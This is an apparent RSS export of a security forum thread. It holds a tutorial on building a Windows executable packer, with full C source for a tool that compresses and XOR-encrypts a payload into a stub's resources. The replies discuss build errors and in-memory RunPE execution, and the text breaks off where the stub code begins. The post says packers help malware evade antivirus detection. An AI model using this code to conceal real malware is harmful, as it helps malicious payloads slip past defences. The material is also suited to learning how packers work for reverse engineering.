+    <atom:link href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[oaktree]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/23">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/23</link>
+        <pubDate>Fri, 22 Dec 2017 00:57:31 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-23</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/22">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/22</link>
+        <pubDate>Fri, 22 Dec 2017 00:41:57 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-22</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 4 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/21">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/21</link>
+        <pubDate>Mon, 11 Dec 2017 18:00:07 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-21</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>You <em>can</em> write it to disk as an option but as I said, you don’t need to because you can use RunPE to load the payload directly into memory for execution. They’re both different functions that do different things.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/20">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/20</link>
+        <pubDate>Fri, 08 Dec 2017 21:47:50 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-20</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[friend_friend]]></dc:creator>
+        <description><![CDATA[
+            <p>yeah but my question is you are dropping the payload unencrypted on the disk . at last will be the same file in disk and this is not a good idea is just my opinion maybe i’m wrong. but using runpe not drop the disk and why? i dont understand in the function you drop the payload so why change the behaviour of your stub just using runpe? i dont understand this well.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/19">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/19</link>
+        <pubDate>Fri, 08 Dec 2017 11:49:50 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-19</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>You don’t need to touch the disk if you use RunPE. And yes, RunPE should work for the packed file.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/18">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/18</link>
+        <pubDate>Thu, 07 Dec 2017 22:53:48 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-18</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[friend_friend]]></dc:creator>
+        <description><![CDATA[
+            <p>i mean the stub combined with payload could be loaded in memory? and at last your stub is dropping the file in disk that’s i think is not good idea. but it’s only my opinion not sure. i was refering to runpe will work with the packed file?</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/17">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/17</link>
+        <pubDate>Thu, 07 Dec 2017 20:52:33 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-17</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Sorry, I don’t quite understand what you’re trying to ask. To which stage are you referring? the packing or the RunPE execution?</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/16">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/16</link>
+        <pubDate>Thu, 07 Dec 2017 02:01:31 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-16</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[Sk0xic]]></dc:creator>
+        <description><![CDATA[
+            <p><strong><em>Awesome like always <a class="mention" href="https://d.clarkee.co.uk/u/dtm">@dtm</a></em></strong></p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/15">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/15</link>
+        <pubDate>Thu, 07 Dec 2017 01:36:38 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-15</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[Mino]]></dc:creator>
+        <description><![CDATA[
+            <p>one small question if this putty generated it’s loaded in memory it will crash?</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/14">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/14</link>
+        <pubDate>Wed, 06 Dec 2017 20:01:35 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-14</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>There’s a download to the source files. Inside, you can manually compile the zlibstat with MSVC++.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/13">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/13</link>
+        <pubDate>Sun, 28 Aug 2016 06:29:43 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-13</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[Wbdn]]></dc:creator>
+        <description><![CDATA[
+            <p>big thanks for help, but now i got virtualAlloc error 487 and next end update resource error 5(win 10 x64 pro))<br>
+also, there is any way to link zlib1 statically?</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/11">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/11</link>
+        <pubDate>Mon, 15 Aug 2016 14:45:14 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-11</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p><a href="http://www.mingw.org/wiki/MS_resource_compiler">MinGW - MS Resource Compiler</a></p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/10</link>
+        <pubDate>Mon, 15 Aug 2016 09:24:38 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-10</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[Wbdn]]></dc:creator>
+        <description><![CDATA[
+            <p>thanks for answer! i’ve compiled packerstub with mingw, how can i include resource file into compilation phase?</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/9</link>
+        <pubDate>Mon, 15 Aug 2016 09:15:58 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-9</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi there.</p>
+<aside class="quote no-group" data-username="Wbdn" data-post="6" data-topic="847">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/letter_avatar_proxy/v4/letter/w/e0b2c6/48.png" class="avatar"> Wbdn:</div>
+<blockquote>
+<p>When i compile with VS i have virtualAlloc error 6</p>
+</blockquote>
+</aside>
+<p>I’m assuming you’re using the RunPE method to execute the payload since it’s default but I did mention that compiling with MSVS would return errors.</p>
+<aside class="quote no-group" data-username="Wbdn" data-post="6" data-topic="847">
+<div class="title">
+<div class="quote-controls"></div>
+<img alt="" width="24" height="24" src="https://d.clarkee.co.uk/letter_avatar_proxy/v4/letter/w/e0b2c6/48.png" class="avatar"> Wbdn:</div>
+<blockquote>
+<p>with mingw i cant link zlib lib</p>
+</blockquote>
+</aside>
+<p>With zLib, I see you’ve used <code>zlibstat.lib</code> which (I believe) isn’t the latest version. You’ll need to navigate the the <a href="http://www.zlib.net/">zLib Home Page</a> and download it from one of these mirrors from this section of the page:<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/1X/118528c7de07bba7ef5c4fca439f8a58a10927d3.PNG" data-download-href="/uploads/short-url/2uZpo2V4BD0ufgQtql8XT58y5nt.PNG?dl=1" title="asdf.PNG"><img src="//0x00sec.s3.amazonaws.com/original/1X/118528c7de07bba7ef5c4fca439f8a58a10927d3.PNG" width="690" height="428"></a></div><br>
+It should come with a <code>zdll.lib</code> with which you should link.<p></p>
+<p>Also, please make sure that you include the resource file <code>rsrc.rc</code> into the compilation phase otherwise <code>Packer.exe</code> will not receive the <code>PackerStub.exe</code> resource.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/7</link>
+        <pubDate>Sun, 14 Aug 2016 23:53:15 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-7</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[Wbdn]]></dc:creator>
+        <description><![CDATA[
+            <p>Nice tut, thank you!<br>
+1st i’ve built packer stub</p>
+
+Screenshot <a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/6">(click for more details)</a>
+<p>next i’ve build packer with stub in same dir [details=Screen]<a href="http://i.imgur.com/Cfgxzln.png" rel="noopener nofollow ugc">link</a> [/details]</p>
+<p>next i’m trying to pack exe<br>
+but i got [details=error]<img src="//0x00sec.s3.amazonaws.com/original/1X/8feaf630847b4c2c437182bb04278a8e849f42e5.PNG" width="690" height="389">[/details]</p>
+<p>When i compile with VS i have virtualAlloc error 6, with mingw i cant link zlib lib</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/6</link>
+        <pubDate>Sun, 14 Aug 2016 20:12:42 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-6</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>You did it!. Very nice solution!</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/5</link>
+        <pubDate>Mon, 01 Aug 2016 16:08:11 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-5</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[root_haxor]]></dc:creator>
+        <description><![CDATA[
+            <p>Great POST brother will learn it you explained it well</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/4</link>
+        <pubDate>Mon, 01 Aug 2016 13:55:16 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-4</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Bump. Updated information.</p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/3</link>
+        <pubDate>Mon, 01 Aug 2016 12:21:02 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-3</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[0x00pf]]></dc:creator>
+        <description><![CDATA[
+            <p>Great post as usual mate! <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
+          <p><a href="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847/2</link>
+        <pubDate>Fri, 29 Jul 2016 16:09:50 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-847-2</guid>
+        <source url="https://d.clarkee.co.uk/t/packers-executable-compression-and-data-obfuscation/847.rss">Packers - Executable Compression and Data Obfuscation</source>
+      </item>
+      <item>
+        <title>Packers - Executable Compression and Data Obfuscation</title>
+        <dc:creator><![CDATA[dtm]]></dc:creator>
+        <description><![CDATA[
+            <p>Greetings, all. The following paper will be documenting an example of executable compression, AKA <em>packers</em> which I have developed over the past couple of days. Like <em>crypters</em>, I feel as though they are some form of hidden dark art of the underground communities. Though there are many publicly available packers out there (UPX, Themida, etc.), I have not seen many papers or articles on how to create them but I have happened to come across <a href="https://www.google.com.au/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;ved=0ahUKEwi2hM3ajpjOAhVJI5QKHa0kDz0QFggdMAA&amp;url=http%3A%2F%2Fwww.rohitab.com%2Fdiscuss%2Findex.php%3Fapp%3Dcore%26module%3Dattach%26section%3Dattach%26attach_id%3D4507&amp;usg=AFQjCNH_pvKsYDQ5Q70xsD-J1KmXWk-hfQ&amp;sig2=KYQyHixtZstB_FIOeuiAug&amp;cad=rja">Gunther’s How to Write a Simple Executable Packer in C</a> which has enabled me to pursue further research on this enigmatic topic. After reading this, I hope all of you will gain an understanding of at least how these tools function.</p>
+<p><strong>Disclaimer</strong>: The following material may not be beginner-friendly as it requires a fair amount of knowledge of Windows programming.</p>
+<pre><code class="lang-makefile">Proficiency in C/C++
+Knowledge of the WinAPI and its documentation
+Knowledge of basic cryptography
+Knowledge of file compression
+Knowledge of the PE file structure
+</code></pre>
+<hr>
+<h2>An Introduction to Packers</h2>
+<p><em>Packers</em> are a tool which are used for their spacial advantages and deterring reverse engineering attempts such as disassembly by obfuscating the data through compression. Because of the resulting data obfuscation characteristic, it allows malware developers to hide malicious code within executables to evade antivirus detection. This behavior is similar to that of crypters which use encryption for data obfuscation. Packers can also utilize the encryption method of crypters to provide a double layer of obfuscation where compression is the next <em>step</em>. Let’s get a visual representation of a packed executable in action.</p>
+<p>The <strong>packer</strong> is responsible for compressing (and encrypting) the payload.</p>
+<pre><code class="lang-makefile">+---------+    +--------+    +------+--------------------------------+
+| Payload | -&gt; | Packer | =&gt; | Stub | Compressed + encrypted payload |
++---------+    +--------+    +------+--------------------------------+
+</code></pre>
+<p>The <strong>stub</strong> is the part of the executable which extracts (decrypts and decompresses) the payload for execution.</p>
+<pre><code class="lang-makefile">+------+--------------------------------+                 +------------------+
+| Stub | Compressed + encrypted payload | == execution =&gt; | Original payload |
++------+--------------------------------+                 +------------------+
+</code></pre>
+<hr>
+<h2>Coding the Packer</h2>
+<p>The packer is required to compress and encrypt the payload, then add it to the stub. The following provides a possible packer design.</p>
+<h3>Packer Pseudocode</h3>
+<pre><code class="lang-makefile">1. Read the payload file into a buffer
+2. Update struct with a pointer to the buffer and its size 
+3. Compress the payload buffer
+4. Encrypt the buffer
+5. Create the stub output file
+6. Update the stub by adding the payload buffer
+</code></pre>
+<p>Here is the code for this design.</p>
+<pre><code class="lang-auto">#include &lt;stdio.h&gt;
+#include &lt;stdarg.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wincrypt.h&gt;
+#include &lt;zlib.h&gt;
+
+#include "resource.h"
+
+#define WIN32_LEAN_AND_MEAN
+#define DEBUG
+#define DEBUG_TITLE "STUB - DEBUG MESSAGE"
+
+#define BUFFER_RSRC_ID 10
+#define FILE_SIZE_RSRC_ID 20
+#define KEY_RSRC_ID 30
+
+#define KEY_LEN 64
+
+typedef struct _FileStruct {
+    PBYTE pBuffer;
+    DWORD dwBufSize;
+    DWORD dwFileSize;
+    PBYTE pKey;
+} FileStruct, *pFileStruct;
+
+VOID Debug(LPCSTR fmt, ...) {
+#ifdef DEBUG
+    va_list args;
+
+    va_start(args, fmt);
+    vprintf(fmt, args);
+
+    va_end(args);
+#endif
+}
+
+FileStruct *LoadFile(LPCSTR szFileName) {
+    Debug("Loading %s...\n", szFileName);
+
+    Debug("Initializing struct...\n");
+    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
+    if (fs == NULL) {
+        Debug("Create %s file structure error: %lu\n", szFileName, GetLastError());
+        return NULL;
+    }
+
+    Debug("Initializing file...\n");
+    // get file handle to file
+    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug("Create file error: %lu\n", GetLastError());
+        free(fs);
+        return NULL;
+    }
+
+    // get file size
+    Debug("Retrieving file size...\n");
+    fs-&gt;dwFileSize = GetFileSize(hFile, NULL);
+    if (fs-&gt;dwFileSize == INVALID_FILE_SIZE) {
+        Debug("Get file size error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+    fs-&gt;dwBufSize = fs-&gt;dwFileSize;
+
+    // create heap buffer to hold file contents
+    fs-&gt;pBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
+    if (fs-&gt;pBuffer == NULL) {
+        Debug("Create buffer error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+
+    // read file contents
+    Debug("Reading file contents...\n");
+    DWORD dwRead = 0;
+    if (ReadFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwRead, NULL) == FALSE) {
+        Debug("Read file error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(fs);
+        return NULL;
+    }
+    Debug("Read 0x%08x bytes\n\n", dwRead);
+
+    // clean up
+    CloseHandle(hFile);
+
+    return fs;
+}
+
+BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs) {
+    // start updating stub's resources
+    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
+    // add file as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // add file size as a resource to stub
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PVOID)&amp;fs-&gt;dwFileSize, sizeof(DWORD)) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // add decryption key as a resource
+    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) {
+        Debug("Update resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    EndUpdateResource(hUpdate, FALSE);
+
+    return TRUE;
+}
+
+BOOL BuildStub(LPCSTR szFileName, FileStruct *fs) {
+    Debug("Building stub: %s...\n", szFileName);
+
+    // get stub program as a resource
+    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
+    if (hRsrc == NULL) {
+        Debug("Find stub resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+    DWORD dwSize = SizeofResource(NULL, hRsrc);
+
+    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
+    if (hGlobal == NULL) {
+        Debug("Load stub resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // get stub's file content
+    PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
+    if (pBuffer == NULL) {
+        Debug("Lock stub resource error: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    // create output file
+    Debug("Creating stub...\n");
+    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        Debug("Create stub error: %lu\n", GetLastError());
+        free(pBuffer);
+        return FALSE;    
+    }
+
+    // write stub content to output file
+    Debug("Writing payload to stub...\n");
+    DWORD dwWritten = 0;
+    if (WriteFile(hFile, pBuffer, dwSize, &amp;dwWritten, NULL) == FALSE) {
+        Debug("Write payload to stub error: %lu\n", GetLastError());
+        CloseHandle(hFile);
+        free(pBuffer);
+        return FALSE;
+    }
+    Debug("Wrote 0x%08x bytes\n\n");
+
+    CloseHandle(hFile);
+
+    // add payload to stub
+    Debug("Updating stub with payload...\n");
+    if (UpdateStub(szFileName, fs) == FALSE)
+        return FALSE;
+
+    return TRUE;
+}
+
+BOOL GenerateKey(FileStruct *fs) {
+    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
+    if (fs-&gt;pKey == NULL) return FALSE;
+
+    // initialize crypto service provider
+    HCRYPTPROV hProv = NULL;
+    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
+        Debug("Crypt aquire context error: %lu\n", GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+
+    // generate secure bytes
+    Debug("Generating cryptographically secure bytes...\n");
+    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) {
+        Debug("Generate random key error: %lu\n", GetLastError());
+        free(fs-&gt;pKey);
+        return FALSE;
+    }
+    Debug("Using key: ");
+    for (int i = 0; i &lt; KEY_LEN; i++)
+        Debug("0x%02x ", fs-&gt;pKey[i]);
+    Debug("\n");
+
+    // clean up
+    CryptReleaseContext(hProv, 0);
+
+    return TRUE;
+}
+
+// XOR
+BOOL EncryptPayload(FileStruct *fs) {
+    Debug("EncryptPayloading payload...\n");
+
+    Debug("Generating key...\n");
+    if (GenerateKey(fs) == FALSE) return FALSE;
+
+    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
+        fs-&gt;pBuffer[i] ^= fs-&gt;pKey[i % KEY_LEN];
+
+    Debug("EncryptPayloadion routine complete\n");
+    return TRUE;
+}
+
+BOOL CompressPayload(FileStruct *fs) {
+    Debug("Compressing payload...\n");
+    
+    PBYTE pCompressedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
+    ULONG ulCompressedBufSize = compressBound((ULONG)fs-&gt;dwBufSize);
+    compress(pCompressedBuffer, &amp;ulCompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwBufSize);
+
+    fs-&gt;pBuffer = pCompressedBuffer;
+    fs-&gt;dwBufSize = ulCompressedBufSize;
+
+    Debug("Compression routine complete\n");
+    return TRUE;
+}
+
+int main(int argc, char *argv[]) {
+    printf("Copyright (C) 2016  93aef0ce4dd141ece6f5\n\n");
+    if (argc &lt; 3) {
+        Debug("Usage: %s [INPUT FILE] [OUTPUT FILE]\n", argv[0]);
+        return 1;
+    }
+
+    FileStruct *fs = LoadFile(argv[1]);
+    if (fs == NULL) return 1;
+
+    Debug("Applying obfuscation...\n");
+    if (CompressPayload(fs) == FALSE) {
+        free(fs);
+        return 1;
+    }
+
+    if (EncryptPayload(fs) == FALSE) {
+        free(fs);
+        return 1;
+    }
+    Debug("\n");
+
+    if (BuildStub(argv[2], fs) == FALSE) {
+        free(fs-&gt;pKey);
+        free(fs);
+        return 1;
+    }
+
+    // clean up
+    free(fs-&gt;pKey);
+    free(fs);
+
+    Debug("\nDone\n");
+
+    return 0;
+}
+</code></pre>
+<p>The <code>CompressPayload</code> function uses the <a>zLib</a> third party compression library to perform the compression routine on the payload buffer.</p>
+<p>The <code>EncryptPayload</code> function uses the XOR cipher method purely as an example. Use of other ciphers in place of the XOR such as RC4 or AES is entirely possible. There is a function within this function, <code>GenerateKey</code> which uses the WinAPI’s Cryptography library to uniquely (for each execution of the program) generate a 32-bit length key using a CSPRNG.</p>
+<p>The <code>BuildStub</code> function creates and adds resources to the stub. These resources are the information stored inside the file struct <code>_FileStruct</code> as it is required in the routines within the stub itself. These resources will be visually shown after the stub code is covered.</p>
+<hr>
+<h2>Coding the Stub</h2>
+<p>The stub is responsible for the extraction and execution of the payload. Note that it must be the reverse operation of the packer. The following shows a possible design.</p>
+<h3>Stub Pseudocode</h3>
+<pre><code class="lang-makefile">1. Extract the resources
+2. Decrypt the payload buffer
+3. Decompress the buffer
+4. Drop the payload
+5. Execute the payload
+</code></pre>
+<p>The code for this design is as follows.</p>
+<pre><code class="lang-cpp">#include &lt;stdio.h&gt;
